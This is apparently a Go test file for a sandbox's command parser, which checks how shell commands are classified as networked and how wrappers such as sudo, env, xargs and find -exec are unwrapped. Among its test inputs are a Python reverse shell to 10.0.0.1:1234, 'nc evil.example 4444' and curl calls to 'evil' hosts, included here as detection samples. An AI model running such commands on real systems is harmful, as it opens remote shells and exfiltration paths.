package command

import (
	"strings"
	"testing"
)

// TestRegistryRejectsDuplicates guards the invariant that no two commands
// share a name — registering `env` as a builtin once shadowed the env Wrapper
// and let `env … curl` run unconfined. The Registry now refuses that outright.
func TestRegistryRejectsDuplicates(t *testing.T) {
	if _, err := NewRegistry(Curl{}, tool("curl")); err == nil {
		t.Fatal("expected a duplicate-name error")
	}
	if _, err := NewRegistry(defaultCommands()...); err != nil {
		t.Fatalf("default registry has a duplicate: %v", err)
	}
	if Lookup("env") == nil || Lookup("/usr/bin/env") == nil {
		t.Error("env should resolve by bare name and by path")
	}
	if _, ok := Lookup("env").(Wrapper); !ok {
		t.Error("env must be a Wrapper, not a Builtin")
	}
	// gpg is both: allow-listable offline, but its keyserver ops are egress.
	if _, b := Lookup("gpg").(Builtin); !b {
		t.Error("gpg should be a Builtin")
	}
	if _, n := Lookup("gpg").(Networked); !n {
		t.Error("gpg should be Networked")
	}
	if _, ok := Lookup("sshpass").(Wrapper); !ok {
		t.Error("sshpass should be a Wrapper")
	}
	for _, name := range []string{"docker", "podman", "nerdctl"} {
		cmd := Lookup(name)
		if _, ok := cmd.(DockerCommand); !ok {
			t.Errorf("%s command = %T, want DockerCommand", name, cmd)
		}
		if _, ok := cmd.(Structured); !ok {
			t.Errorf("%s must expose DockerParams", name)
		}
	}
}

func TestParseIndicators(t *testing.T) {
	cases := []struct {
		args       []string
		subcommand string
		wantTarget string
		networked  bool
	}{
		{[]string{"openssl", "s_client", "-connect", "evil:443"}, "s_client", "evil:443", true},
		{[]string{"openssl", "s_server", "-port", "4444"}, "s_server", "s_server", true},
		{[]string{"openssl", "dgst", "-connect", "sneaky:443"}, "dgst", "sneaky:443", true}, // -connect on any subcmd
		{[]string{"openssl", "ocsp", "-url", "http://ocsp.evil"}, "ocsp", "http://ocsp.evil", true},
		{[]string{"/usr/bin/openssl", "s_client", "-connect", "x:443"}, "s_client", "x:443", true},
		{[]string{"openssl", "dgst", "-sha3-256", "file"}, "dgst", "", false},
		{[]string{"openssl", "rand", "-hex", "16"}, "rand", "", false},
		{[]string{"openssl"}, "", "", false},
		{[]string{"curl", "-fsSL", "https://x/y", "-o", "out"}, "", "https://x/y", true},
		{[]string{"curl", "s_client"}, "", "s_client", true},
		{[]string{"wget", "https://a/b", "-O", "f"}, "", "https://a/b", true},
		{[]string{"ssh", "user@host", "uptime"}, "", "user@host", true},
		{[]string{"ssh", "-p", "2222", "-J", "jump", "host"}, "", "host", true},
		{[]string{"scp", "-p", "file", "user@host:/tmp/"}, "", "user@host:/tmp/", true},
		{[]string{"scp", "-r", "./a:b", "./c"}, "", "", false}, // local paths with a colon after a slash
		{[]string{"sftp", "example.com"}, "", "example.com", true},
		{[]string{"rsync", "-avz", "-e", "ssh -p 22", "./src/", "host:dst/"}, "", "host:dst/", true},
		{[]string{"rsync", "-a", "rsync://mirror.example/mod/", "./x"}, "", "rsync://mirror.example/mod/", true},
		{[]string{"rsync", "-a", "host::module", "./x"}, "", "host::module", true},
		{[]string{"rsync", "-a", "--delete", "./a/", "./b/"}, "", "", false},
		{[]string{"perl", "-MLWP::Simple", "-e", "getstore($ARGV[0], 'f')", "https://x/y"}, "", "LWP::Simple", true},
		{[]string{"perl", "-e", "use IO::Socket::INET; ..."}, "", "IO::Socket", true},
		{[]string{"perl", "-e", "print 'https://evil.example/p'"}, "", "https://evil.example/p", true},
		{[]string{"perl", "-lne", "print if /x/", "file"}, "", "", false},
		{[]string{"perl", "fetch.pl"}, "", "", false}, // opaque script file: the allow-list is the gate
		// python: the one-line servers and the socket reverse shells
		{[]string{"python3", "-m", "http.server", "8000"}, "", "http.server 8000", true},
		{[]string{"python", "-m", "SimpleHTTPServer"}, "", "SimpleHTTPServer", true},
		{[]string{"python3", "-m", "pip", "install", "requests"}, "", "pip install", true},
		{[]string{"python3", "-m", "json.tool", "f.json"}, "", "", false},
		{[]string{"python", "-c", `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));p=subprocess.call(["/bin/sh","-i"])`}, "", "10.0.0.1:1234", true},
		{[]string{"python3", "-c", `import urllib.request; urllib.request.urlopen("https://x/y")`}, "", "https://x/y", true},
		{[]string{"python3", "-c", "from http.server import HTTPServer"}, "", "http.server", true},
		{[]string{"python3", "-uc", "import requests"}, "", "requests", true},
		{[]string{"python3", "-c", "print(1 + 1)"}, "", "", false},
		{[]string{"python3", "fetch.py"}, "", "", false}, // opaque script file, as with perl
		// the NetTool long tail
		{[]string{"dig", "@8.8.8.8", "example.com", "A"}, "", "8.8.8.8", true},
		{[]string{"dig"}, "", "dig", true}, // no args → root servers
		{[]string{"nslookup", "example.com"}, "", "example.com", true},
		{[]string{"whois", "-h", "whois.iana.org", "example.com"}, "", "example.com", true},
		{[]string{"ping", "-c", "1", "10.0.0.1"}, "", "10.0.0.1", true},
		{[]string{"telnet", "h", "25"}, "", "h:25", true},
		{[]string{"telnet", "h"}, "", "h", true},
		{[]string{"aria2c", "-o", "f", "https://x/y"}, "", "https://x/y", true},
		{[]string{"svn", "checkout", "https://svn.example/r"}, "checkout", "https://svn.example/r", true},
		{[]string{"svn", "status"}, "status", "", false},
		{[]string{"hg", "clone", "https://hg.example/r"}, "clone", "https://hg.example/r", true},
		{[]string{"docker", "pull", "alpine"}, "pull", "alpine", true},
		{[]string{"docker", "run", "-t", "alpine"}, "run", "alpine", true}, // -t is a bool here
		{[]string{"docker", "build", "-t", "app:latest", "."}, "build", ".", true},
		{[]string{"docker", "build", "--pull", "."}, "build", ".", true}, // --pull is a bool here
		{[]string{"docker", "pull", "-a", "alpine"}, "pull", "alpine", true},
		{[]string{"docker", "ps"}, "ps", "", false},
		{[]string{"mysql", "-h", "db.example", "-u", "root"}, "", "db.example", true},
		{[]string{"mysql", "-u", "root", "app"}, "", "", false}, // local socket
		{[]string{"psql", "--host=db", "app"}, "", "db", true},
		{[]string{"gpg", "--keyserver", "hkps://keys.example", "--recv-keys", "ABCD"}, "", "hkps://keys.example", true},
		{[]string{"gpg", "--recv-keys", "ABCD"}, "", "--recv-keys", true},
		{[]string{"gpg", "--verify", "f.asc", "f"}, "", "", false}, // offline: what installers use
		{[]string{"nc", "evil.example", "4444"}, "", "evil.example:4444", true},
		{[]string{"git", "clone", "https://github.com/x/y"}, "clone", "https://github.com/x/y", true},
		{[]string{"git", "status"}, "status", "", false},
		{[]string{"git", "--git-dir=/r/.git", "--work-tree=/r", "fetch", "origin", "tag", "v1", "--depth=1"}, "fetch", "origin", true},
		{[]string{"git", "--git-dir", "/r/.git", "fetch"}, "fetch", "origin", true}, // --git-dir takes a value: not the remote
		{[]string{"git", "-C", "/r", "pull", "upstream", "main"}, "pull", "upstream", true},
		{[]string{"git", "fetch", "--all"}, "fetch", "fetch", true},
		{[]string{"git", "remote", "add", "origin", "https://github.com/x/y"}, "remote", "https://github.com/x/y", true},
		{[]string{"ls", "-la"}, "", "", false},
	}
	for _, c := range cases {
		p := Parse(c.args)
		if p.Subcommand != c.subcommand {
			t.Errorf("%v: subcommand = %q, want %q", c.args, p.Subcommand, c.subcommand)
		}
		target, networked := p.Egress()
		if networked != c.networked || target != c.wantTarget {
			t.Errorf("%v: Egress = %q,%v; want %q,%v", c.args, target, networked, c.wantTarget, c.networked)
		}
	}
}

func TestParseFlags(t *testing.T) {
	// Clustered short flags with a trailing value flag (curl's -fsSLo out).
	p := Parse([]string{"curl", "-fsSL", "https://x", "-o", "out.tgz"})
	if v, ok := p.FlagValue("-o"); !ok || v != "out.tgz" {
		t.Errorf("curl -o = %q,%v; want out.tgz", v, ok)
	}
	if !p.HasFlag("-f") || !p.HasFlag("-L") {
		t.Errorf("expected -f and -L parsed from cluster: %+v", p.Flags)
	}
	if len(p.Operands) != 1 || p.Operands[0] != "https://x" {
		t.Errorf("operands = %v, want [https://x]", p.Operands)
	}
}

func TestSet(t *testing.T) {
	base := NewSet("a", "b")
	wider := base.With("c")
	if len(base) != 2 || !wider["c"] || strings.Join(wider.Names(), "") != "abc" {
		t.Errorf("With must not mutate the receiver: base=%v wider=%v", base, wider)
	}
	if got := Set(nil).Clone(); got == nil {
		t.Error("Clone of nil must be usable")
	}
}

func TestExtractDashC(t *testing.T) {
	cases := []struct {
		args       []string
		wantScript string
		wantParams string
		wantOK     bool
	}{
		{[]string{"sh", "-c", "echo hi"}, "echo hi", "", true},
		{[]string{"bash", "-c", "echo hi", "name", "a"}, "echo hi", "name a", true},
		{[]string{"sh", "-euc", "curl x"}, "curl x", "", true},
		{[]string{"sh", "-e", "-c", "id"}, "id", "", true},
		{[]string{"sh", "script.sh"}, "", "", false}, // file, not -c
		{[]string{"sh"}, "", "", false},
		{[]string{"sh", "-c"}, "", "", false}, // missing script
	}
	for _, c := range cases {
		script, params, ok := extractDashC(c.args)
		if ok != c.wantOK || script != c.wantScript || strings.Join(params, " ") != c.wantParams {
			t.Errorf("extractDashC(%v) = %q,%q,%v; want %q,%q,%v",
				c.args, script, params, ok, c.wantScript, c.wantParams, c.wantOK)
		}
	}
}

func TestUnwrap(t *testing.T) {
	cases := []struct {
		args      []string
		wantChain string // "+"-joined
		wantInner string // space-joined
	}{
		{[]string{"sudo", "apt-get", "install", "docker"}, "sudo", "apt-get install docker"},
		{[]string{"sudo", "-E", "-u", "root", "rm", "-rf", "/x"}, "sudo", "rm -rf /x"},
		{[]string{"env", "FOO=bar", "BAZ=1", "curl", "-o", "x", "URL"}, "env", "curl -o x URL"},
		{[]string{"env", "-u", "PATH", "openssl", "s_client"}, "env", "openssl s_client"},
		{[]string{"timeout", "5", "curl", "URL"}, "timeout", "curl URL"},
		{[]string{"timeout", "-s", "TERM", "10", "wget", "URL"}, "timeout", "wget URL"},
		{[]string{"nice", "-n", "10", "make"}, "nice", "make"},
		{[]string{"xargs", "-n1", "-P4", "rm"}, "xargs", "rm"},
		{[]string{"sudo", "env", "FOO=1", "timeout", "3", "curl", "U"}, "sudo+env+timeout", "curl U"},
		{[]string{"doas", "-u", "root", "pkg", "install"}, "doas", "pkg install"},
		// sudo credential probes run nothing: not unwrapped, reach the sandbox as sudo
		{[]string{"sudo", "-v"}, "", "sudo -v"},
		{[]string{"/usr/bin/sudo", "-n", "-v"}, "", "/usr/bin/sudo -n -v"},
		{[]string{"sudo", "-n", "-l", "mkdir"}, "", "sudo -n -l mkdir"}, // -l CMD checks, doesn't run
		{[]string{"sudo", "-nl", "mkdir"}, "", "sudo -nl mkdir"},
		{[]string{"sudo", "-K"}, "", "sudo -K"},
		{[]string{"sudo", "--validate"}, "", "sudo --validate"},
		{[]string{"sudo", "-k", "true"}, "sudo", "true"},     // -k with a command runs it
		{[]string{"sudo", "-u", "vlad", "id"}, "sudo", "id"}, // a value, not a probe cluster
		{[]string{"sudo", "-n", "true"}, "sudo", "true"},
		// xargs: inner command, its -I replace-string, the -i fix, and the echo default
		{[]string{"xargs", "rm", "-rf"}, "xargs", "rm -rf"},
		{[]string{"xargs", "-I", "{}", "curl", "{}"}, "xargs", "curl {}"},
		{[]string{"xargs", "-i", "rm"}, "xargs", "rm"}, // -i must NOT swallow rm
		{[]string{"xargs", "-0", "-n1", "grep", "x"}, "xargs", "grep x"},
		{[]string{"xargs"}, "xargs", "echo"}, // no command → echo
		// find -exec / -execdir peel out the exec'd command (stop at ; or +)
		{[]string{"find", ".", "-exec", "rm", "-rf", "{}", ";"}, "find", "rm -rf {}"},
		{[]string{"find", "/tmp", "-execdir", "curl", "http://evil", "{}", "+"}, "find", "curl http://evil {}"},
		{[]string{"find", ".", "-name", "*.log"}, "", "find . -name *.log"}, // no exec → not a wrapper
		// not wrappers / no inner command → unchanged
		{[]string{"curl", "-o", "x", "URL"}, "", "curl -o x URL"},
		{[]string{"env"}, "", "env"},
		{[]string{"nohup"}, "", "nohup"},
	}
	for _, c := range cases {
		chain, inner := Unwrap(c.args)
		if got := strings.Join(chain, "+"); got != c.wantChain {
			t.Errorf("Unwrap(%v) chain = %q, want %q", c.args, got, c.wantChain)
		}
		if got := strings.Join(inner, " "); got != c.wantInner {
			t.Errorf("Unwrap(%v) inner = %q, want %q", c.args, got, c.wantInner)
		}
	}
}

// TestRequest covers the two downloader forms the uv installer actually emits,
// plus the curl/wget asymmetries (-O, -o, -U, -d → POST).
func TestRequest(t *testing.T) {
	req := func(args ...string) Request {
		t.Helper()
		d, ok := Lookup(args[0]).(Downloader)
		if !ok {
			t.Fatalf("%s is not a Downloader", args[0])
		}
		return d.Request(Parse(args))
	}

	curl := req("curl", "-sSfL", "--header", "Authorization: Bearer tok", "https://releases.astral.sh/x", "-o", "out.tar.gz")
	if curl.URL != "https://releases.astral.sh/x" || curl.Output != "out.tar.gz" {
		t.Fatalf("curl url/out wrong: %+v", curl)
	}
	if !curl.FailOnHTTP || !curl.Follow || curl.Head || curl.RemoteName {
		t.Fatalf("curl -sSfL flags not parsed: %+v", curl)
	}
	if got := curl.Headers.Get("Authorization"); got != "Bearer tok" {
		t.Fatalf("header = %q", got)
	}

	plain := req("curl", "https://x/y")
	if plain.Follow {
		t.Error("curl without -L must not follow redirects")
	}
	post := req("curl", "-d", "a=b", "-A", "ua", "-e", "ref", "-b", "c=1", "-O", "https://x/y")
	if post.Method != "POST" || !post.RemoteName || post.Headers.Get("User-Agent") != "ua" ||
		post.Headers.Get("Referer") != "ref" || post.Headers.Get("Cookie") != "c=1" {
		t.Errorf("curl POST/-O/header shorthands wrong: %+v", post)
	}
	if head := req("curl", "-I", "https://x"); !head.Head {
		t.Errorf("curl -I not parsed: %+v", head)
	}

	wget := req("wget", "--header", "X-A: 1", "https://github.com/astral-sh/uv", "-O", "uv.tgz")
	if wget.URL != "https://github.com/astral-sh/uv" || wget.Output != "uv.tgz" {
		t.Fatalf("wget url/out wrong: %+v", wget)
	}
	if !wget.Follow || wget.Headers.Get("X-A") != "1" { // wget follows redirects by default
		t.Fatalf("wget defaults/headers wrong: %+v", wget)
	}
	if lg := req("wget", "-o", "log.txt", "-U", "ua", "https://x"); lg.Output != "" || lg.Headers.Get("User-Agent") != "ua" {
		t.Errorf("wget -o is a logfile, not the output: %+v", lg)
	}
}

// TestStopAtOperand: ssh, perl and python stop option parsing at the first
// operand, so flags meant for the remote command or the script are not misread
// as theirs.
func TestStopAtOperand(t *testing.T) {
	p := Parse([]string{"ssh", "-p", "22", "host", "ls", "-la", "-p", "x"})
	if got := strings.Join(p.Operands, " "); got != "host ls -la -p x" || p.Flags["-p"][0] != "22" || len(p.Flags["-p"]) != 1 {
		t.Errorf("ssh operands = %q flags = %v", got, p.Flags)
	}
	p = Parse([]string{"perl", "script.pl", "-e", "not code"})
	if len(p.Flags["-e"]) != 0 || len(p.Operands) != 3 {
		t.Errorf("perl script args must not parse as -e: %+v", p)
	}
	p = Parse([]string{"python3", "script.py", "-m", "not.a.module"})
	if len(p.Flags["-m"]) != 0 || len(p.Operands) != 3 {
		t.Errorf("python script args must not parse as -m: %+v", p)
	}
	// rsync permutes: a flag after an operand is still a flag.
	if p = Parse([]string{"rsync", "./a", "-n", "./b"}); !p.HasFlag("-n") {
		t.Errorf("rsync should still see -n after an operand: %+v", p)
	}
}
